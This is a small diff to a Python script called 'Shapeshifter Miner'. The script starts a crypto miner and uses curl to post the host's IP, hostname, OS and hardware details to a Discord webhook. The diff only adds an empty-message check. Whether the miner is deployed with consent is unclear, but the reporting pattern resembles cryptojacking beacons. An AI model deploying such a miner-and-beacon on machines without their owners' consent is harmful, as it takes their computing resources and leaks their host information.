@@ -26,6 +26,9 @@ def get_system_info():
 
 def send_notification(message):
     """Send a notification to Discord webhook"""
+    if not message.strip():  # Avoid sending empty messages
+        print("❌ Empty message, skipping webhook.")
+        return
     try:
         subprocess.run(['curl', '-X', 'POST', WEBHOOK, '--data', f'{{"content": "{message}"}}'])
     except Exception as e:
@@ -63,8 +66,10 @@ def monitor_miner(process):
 def main():
     """Main script loop"""
     send_notification("🚀 Shapeshifter Miner starting...")
+
     system_info = get_system_info()
     message = f"✅ Miner Initialized\nIP: {system_info['IP']}\nHostname: {system_info['Hostname']}\nOS: {system_info['OS']}\nCPU: {system_info['CPU']}\nRAM: {system_info['RAM']}\nThreads: {system_info['Threads']}\nWorker: {WORKER_NAME}"
+
     send_notification(message)
 
     miner_process = start_miner()
